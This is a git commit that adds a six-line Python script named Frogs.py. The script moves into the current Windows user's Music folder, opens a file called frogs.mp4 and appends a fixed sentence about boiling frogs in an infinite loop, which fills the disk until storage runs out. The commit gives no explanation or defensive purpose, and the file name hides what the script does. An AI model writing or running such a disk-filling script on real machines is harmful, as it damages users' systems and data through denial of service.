50bdcf290174d9829aa9d8a54aacef2e3b2d30e2
NagisaUrchin <128938538+NagisaUrchin@users.noreply.github.com>
2023-03-25 21:17:48 -0500

    Add files via upload

---
+++ Frogs.py
@@ -0,0 +1,6 @@
+import os
+os.chdir(f'C:/Users/{os.getlogin()}/Music')
+f = open("frogs.mp4", "a")
+while 1==1:
+    f.write("The water is boiling but the frogs do not realize> The water will boil, the frogs will die.")
+f.close()
